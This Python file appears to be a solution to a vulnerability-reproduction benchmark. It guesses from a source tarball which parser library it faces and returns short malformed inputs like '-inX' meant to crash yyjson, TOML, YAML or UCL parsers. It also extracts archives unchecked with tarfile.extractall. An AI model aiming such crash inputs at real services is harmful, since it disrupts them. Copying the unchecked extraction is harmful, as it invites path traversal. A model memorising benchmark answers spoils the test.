import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        def make_len(b: bytes, n: int = 16) -> bytes:
            if len(b) >= n:
                return b[:n]
            return b + b' ' * (n - len(b))

        def gen_default() -> bytes:
            return make_len(b"[-inX]\n[-inX]\n[]")

        def gen_yyjson() -> bytes:
            # JSON with a minus sign and a non-infinity token following it
            return make_len(b"[-inX]\n[-inX]\n")

        def gen_toml() -> bytes:
            # TOML: key with a negative sign followed by a non-infinity token
            return make_len(b"a=-inX\nb=-inX\n")

        def gen_yaml() -> bytes:
            # YAML: scalars that look like negative + non-infinity tokens
            return make_len(b"- -inX\n- -inX\n")

        def gen_ucl() -> bytes:
            # UCL/JSON-like
            return make_len(b"{a:-inX,b:-inX}")

        # Try simple filename heuristics first
        bn = os.path.basename(src_path).lower()
        if "yyjson" in bn:
            return gen_yyjson()
        if "toml" in bn:
            return gen_toml()
        if "yaml" in bn or "fyaml" in bn or "libfyaml" in bn:
            return gen_yaml()
        if "ucl" in bn:
            return gen_ucl()

        # Extract and inspect contents for better heuristics
        try:
            with tempfile.TemporaryDirectory() as td:
                try:
                    with tarfile.open(src_path, 'r:*') as tf:
                        tf.extractall(td)
                except Exception:
                    # If extraction fails, fallback to default PoC
                    return gen_default()

                found_yyjson = False
                found_toml = False
                found_yaml = False
                found_ucl = False

                for root, _, files in os.walk(td):
                    for f in files:
                        fl = f.lower()
                        p = os.path.join(root, f)
                        if any(k in fl for k in ("yyjson.h", "yyjson.c", "yyjson")):
                            found_yyjson = True
                        if any(k in fl for k in ("toml.h", "toml.c", "tomlc99", "toml", "toml++")):
                            found_toml = True
                        if any(k in fl for k in ("fy-", "libfyaml", "yaml", "fyaml")):
                            found_yaml = True
                        if any(k in fl for k in ("ucl.h", "ucl.c", "libucl", "ucl")):
                            found_ucl = True

                        if not (found_yyjson or found_toml or found_yaml or found_ucl):
                            # Try content-based heuristics
                            try:
                                with open(p, 'rb') as fh:
                                    data = fh.read(8192).lower()
                                if b'yyjson' in data:
                                    found_yyjson = True
                                if b'toml' in data and (b'parse' in data or b'table' in data):
                                    found_toml = True
                                if b'fy_' in data or b'libfyaml' in data or b'yaml' in data:
                                    found_yaml = True
                                if b'libucl' in data or b'ucl_' in data:
                                    found_ucl = True
                            except Exception:
                                pass

                if found_yyjson:
                    return gen_yyjson()
                if found_toml:
                    return gen_toml()
                if found_yaml:
                    return gen_yaml()
                if found_ucl:
                    return gen_ucl()
                return gen_default()
        except Exception:
            return gen_default()
